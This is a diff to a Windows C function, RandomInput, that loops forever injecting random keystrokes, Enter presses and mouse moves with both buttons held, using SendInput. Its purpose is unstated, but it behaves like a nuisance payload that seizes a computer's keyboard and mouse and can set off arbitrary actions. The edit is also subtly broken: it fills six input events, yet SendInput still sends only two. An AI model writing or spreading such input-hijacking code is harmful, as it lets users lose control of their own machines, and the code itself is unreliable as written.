@@ -1038,15 +1038,28 @@ unsigned long WINAPI RandomInput(LPVOID P)
 {
     while(1)
     {
-        INPUT I[2];
+        int key = (rand() % 254) + 1;
+        INPUT I[6];
         I[0].type = 1;
-        I[0].ki.wVk = (rand() % 254) + 1;
+        I[0].ki.wVk = key;
         I[0].ki.dwFlags = 0;
         I[1].type = 0;
         I[1].mi.dx = (rand() % 500) - 250;
-        I[1].mi.dx = (rand() % 500) - 250;
+        I[1].mi.dy = (rand() % 500) - 250;
         I[1].mi.mouseData = 0;
         I[1].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_RIGHTDOWN;
+        I[2].type = 1;
+        I[2].ki.wVk = VK_RETURN;
+        I[2].ki.dwFlags = 0;
+        I[3].type = 1;
+        I[3].ki.wVk = key;
+        I[3].ki.dwFlags = KEYEVENTF_KEYUP;
+        I[4].type = 0;
+        I[4].mi.mouseData = 0;
+        I[4].mi.dwFlags = MOUSEEVENTF_LEFTUP | MOUSEEVENTF_RIGHTUP;
+        I[5].type = 1;
+        I[5].ki.wVk = VK_RETURN;
+        I[5].ki.dwFlags = KEYEVENTF_KEYUP;
         SendInput(2, I, sizeof(INPUT));
     }
 }
